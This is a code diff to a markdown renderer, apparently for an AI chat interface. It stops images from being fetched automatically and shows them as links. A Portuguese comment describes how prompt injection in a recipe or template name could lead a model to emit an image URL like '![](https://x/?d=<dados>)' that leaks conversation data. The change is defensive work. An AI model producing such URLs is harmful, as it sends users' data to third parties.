@@ -32,6 +32,20 @@ const components: Partial<Components> = {
 		</a>
 	),
 
+	// Imagem NUNCA é buscada. O texto aqui vem de um modelo, e um modelo sob prompt injection
+	// (texto plantado numa receita, num nome de template) escreve `![](https://x/?d=<dados>)`:
+	// o navegador faria o GET sozinho, sem clique, levando na query string o que a conversa
+	// tiver lido. Vira link com o texto alternativo — sair do app passa a exigir um clique.
+	img: ({ src, alt }) => {
+		const label = alt?.trim() ? `imagem: ${alt.trim()}` : "imagem"
+		if (typeof src !== "string" || !/^https?:\/\//i.test(src)) return <span className="opacity-70">[{label}]</span>
+		return (
+			<a href={src} target="_blank" rel="noopener noreferrer nofollow" className="underline opacity-80 hover:opacity-100">
+				[{label}]
+			</a>
+		)
+	},
+
 	ul: ({ children }) => <ul className="mb-1 list-disc pl-5 last:mb-0">{children}</ul>,
 	ol: ({ children }) => <ol className="mb-1 list-decimal pl-5 last:mb-0">{children}</ol>,
 	li: ({ children }) => <li className="mb-0.5 last:mb-0">{children}</li>,
